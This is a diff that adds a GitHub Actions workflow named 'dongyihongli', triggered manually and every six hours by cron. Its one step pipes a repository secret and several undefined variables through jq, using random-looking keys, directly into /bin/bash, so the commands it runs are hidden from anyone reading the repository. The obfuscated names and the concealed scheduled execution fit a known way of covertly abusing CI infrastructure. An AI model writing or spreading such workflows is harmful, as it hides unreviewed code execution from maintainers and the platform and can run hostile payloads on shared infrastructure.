@@ -1,0 +1,24 @@
+name: dongyihongli
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongyihongli
+        env:
+          z7: ${{ secrets.z7 }}
+        run: |
+          echo $z7 | jq -r .ptuil9831 | /bin/bash
+          echo $lo4 | jq -r .fxhub4121 | /bin/bash
+          echo $eces84 | jq -r .zzblz02 | /bin/bash
+          echo $epptw2 | jq -r .g0743 | /bin/bash
+          echo $cm7 | jq -r .lv131 | /bin/bash
+          echo $iaj1953 | jq -r .t3350 | /bin/bash
+          echo $cvdg0 | jq -r .jope21210 | /bin/bash
+          echo $l2 | jq -r .t0260 | /bin/bash
+          echo $rlut0144 | jq -r .bj24 | /bin/bash
+
